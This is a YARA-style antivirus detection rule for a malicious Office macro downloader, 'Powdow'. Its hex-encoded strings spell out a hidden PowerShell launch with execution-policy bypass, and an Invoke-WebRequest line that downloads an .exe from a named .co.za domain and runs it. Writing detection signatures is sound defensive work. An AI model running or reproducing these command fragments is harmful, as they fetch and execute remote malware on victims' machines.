
rule TrojanDownloader_O97M_Powdow_STY_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.STY!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {70 6f 77 65 72 73 68 65 6c 6c 20 2d 57 69 6e 64 6f 77 53 74 79 6c 65 20 68 69 64 64 65 6e 20 2d 65 78 65 63 75 74 69 6f 6e 70 6f 6c 69 63 79 20 62 79 70 61 73 73 3b 20 } //01 00  powershell -WindowStyle hidden -executionpolicy bypass; 
		$a_01_1 = {49 6e 76 6f 6b 65 2d 57 65 62 52 65 71 75 65 73 74 20 2d 55 72 69 20 22 22 68 74 74 70 73 3a 2f 2f 61 66 72 69 6b 61 6e 69 73 74 2d 77 6f 72 6b 2e 63 6f 2e 7a 61 2f 44 44 44 2e 65 78 65 22 22 20 2d 4f 75 74 46 69 6c 65 20 24 54 65 6d 70 46 69 6c 65 3b 20 53 74 61 72 74 2d 50 72 6f 63 65 73 73 20 24 54 65 6d 70 46 69 6c 65 3b } //01 00  Invoke-WebRequest -Uri ""https://afrikanist-work.co.za/DDD.exe"" -OutFile $TempFile; Start-Process $TempFile;
		$a_01_2 = {53 65 74 20 48 65 63 6b 72 79 6e 76 73 45 78 65 63 20 3d 20 48 65 63 6b 72 79 6e 76 73 2e 45 78 65 63 28 4e 68 6a 69 73 29 } //00 00  Set HeckrynvsExec = Heckrynvs.Exec(Nhjis)
	condition:
		any of ($a_*)
 
}